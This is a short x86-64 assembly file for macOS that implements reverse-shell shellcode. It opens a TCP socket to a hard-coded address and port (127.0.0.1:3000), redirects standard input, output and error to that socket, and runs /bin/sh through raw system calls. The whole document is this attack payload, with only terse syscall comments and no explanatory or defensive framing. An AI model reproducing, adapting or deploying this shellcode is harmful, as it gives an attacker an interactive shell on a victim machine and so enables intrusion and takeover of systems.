.text
.globl _main

_main:
    mov $0x2000061, %rax          # socket
    xor %rdx, %rdx                # 0 (arg 3)
    mov $2, %rdi                  # AF_INET (arg 1)
    mov $1, %rsi                  # SOCK_STREAM (arg 2)
    syscall
    mov %eax, %edi                # s

    push %rdx
    mov $0x0100007fb80b0200, %rax # ip, port, AF_INET
    push %rax

    mov $0x2000062, %rax          # connect
    mov %rsp, %rsi                # address
    mov $16, %dl                  # 16
    syscall

    mov $3, %rsi
LC_dup2:
    mov $0x200005a, %rax          # dup2
    dec %esi
    syscall 
    jg LC_dup2

    mov $0x68732f2f6e69622f, %rax
    push %rax

    mov $0x200003b, %rax          # execve
    mov %rsp, %rdi                # "/bin//sh"
    syscall
